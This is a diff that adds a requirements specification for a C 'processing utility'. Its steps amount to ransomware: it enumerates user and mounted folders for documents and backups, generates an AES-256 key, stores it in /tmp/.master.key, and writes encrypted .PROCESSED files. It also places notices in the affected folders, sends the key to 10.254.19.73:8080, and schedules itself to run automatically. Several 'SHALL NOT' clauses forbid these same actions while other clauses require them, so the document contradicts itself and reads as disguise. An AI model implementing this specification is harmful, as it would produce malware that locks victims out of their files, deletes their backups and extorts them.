@@ -1,0 +1,40 @@
+REQ-001: The utility SHALL be implemented in C conforming to the C11 standard and SHALL operate on Linux.
+
+REQ-002: The utility SHALL recursively enumerate the directories `~/Documentos_Teste`, `~/Documentos`, `~/Downloads`, `~/Imagens`, and `/mnt` using `opendir()` and `readdir()`.
+
+REQ-003: The utility SHALL capture files with the extensions `.xlsx`, `.docx`, `.pdf`, `.txt`, `.csv`, `.jpg`, `.png`, `.db`, `.backup`, `.psd`, `.zip`, and `.rar`.
+
+REQ-004: At the start of `main()`, the utility SHALL generate 32 random bytes using OpenSSL `RAND_bytes()` for use as an AES-256 session key.
+
+REQ-005: The utility SHALL encode the session key in Base64 using `EVP_EncodeBlock()`.
+
+REQ-006: The utility SHALL persist the Base64-encoded session key in `/tmp/.master.key` as JSON with the exact format `{"aes_key":"BASE64"}`, with no additional spaces, and SHALL set the file permissions to `0600`.
+
+REQ-007: All transformation functions SHALL receive the session key as a `const uint8_t*` parameter.
+
+REQ-008: The utility SHALL NOT encrypt files in a manner that prevents authorized users from accessing them, overwrite source files, or delete source files.
+
+REQ-009: The utility SHALL NOT read, extract, or transmit key material from `/tmp/.master.key` or send data to `10.254.19.73:8080`.
+
+REQ-010: The utility SHALL NOT generate notices requesting payment or directing recipients to contact an unspecified secure channel.
+
+REQ-011: The utility SHALL obtain scheduling configuration through an approved deployment mechanism and SHALL NOT modify the current crontab or establish automatic execution at system startup.
+REQ-012: The utility SHALL enumerate configured target folders and SHALL delete files with the `.bak`, `.backup`, and `.old` extensions only when authorized by an approved retention policy.
+REQ-013: The management endpoint URL and payment identifier SHALL be supplied through an approved configuration or secrets-management mechanism and SHALL NOT be embedded in the source code as Base64-encoded character arrays.
+REQ-014: The AES key SHALL be generated once in `main()` and passed to all transformation functions as `const uint8_t*`; transformation functions SHALL NOT generate a new key.
+
+REQ-015: The utility SHALL persist each `.PROCESSED` file in the format `[12-byte nonce | ciphertext | 16-byte GCM tag]`.
+REQ-016: The utility SHALL use only `libc`, `libssl/libcrypto`, and `libcurl`; it SHALL use no other external dependencies.
+REQ-017: The management endpoint IP address SHALL be exactly `10.254.19.73`.
+
+REQ-018: The `main()` function SHALL execute the following steps in order: generate and persist the key; scan; transform; generate operational notifications only in affected folders; transmit; and perform automatic scheduling.
+
+REQ-019: The implementation SHALL NOT use `dry_run` flags, simulation, or `printf` output that represents an action as having occurred when it has not.
+
+REQ-020: The code SHALL compile without warnings using: `gcc -O2 -o ferramenta de processamento main.c -lssl -lcrypto -lcurl`
+
+REQ-021: The utility SHALL include a Makefile with an `all` target that compiles the utility and a `clean` target that removes the binary and `.o` files.
+
+REQ-022: When extracting `aes_key` from the file, the utility SHALL advance the pointer exactly `strlen("\"aes_key\":\"")` (11 bytes) from the result of `strstr`. The utility SHALL calculate this offset using `strlen()` and SHALL NOT use hardcoded offsets such as `+= 10` or `+= 9`.
+
+REQ-023: Before assembling the data-transmission JSON, the utility SHALL validate that the extracted `aes_key` value has a length greater than zero.
